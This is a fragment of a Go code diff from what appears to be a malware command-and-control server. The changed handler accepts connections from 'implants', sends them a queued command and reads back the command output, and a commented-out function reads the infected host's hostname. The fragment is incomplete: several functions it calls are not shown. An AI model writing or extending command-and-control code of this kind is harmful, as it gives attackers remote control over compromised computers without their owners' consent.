@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bufio"
 	"log"
 	"net"
 )
@@ -19,18 +20,28 @@ func initalizeServer() {
 			log.Println("[-] Error accepting connection")
 			continue
 		}
+
 		go handleImplants(conn)
 	}
 }
 
+/* func GetHostname(reader *bufio.Reader) string {
+	hostname, err := reader.ReadString('\n')
+	if err != nil {
+		return "unknown"
+	}
+	return strings.TrimSpace(hostname)
+
+} */
+
 func handleImplants(conn net.Conn) {
 	defer conn.Close()
+	reader := bufio.NewReader(conn)
+	reader.ReadString('\n')
+
 	if pendingCommand != "" {
 		sendCommands(conn)
 		pendingCommand = ""
-		receiveOutput(conn)
-	} else {
-		conn.Write([]byte("NO_COMMAND"))
+		receiveOutput(reader)
 	}
-	receiveOutput(conn)
 }
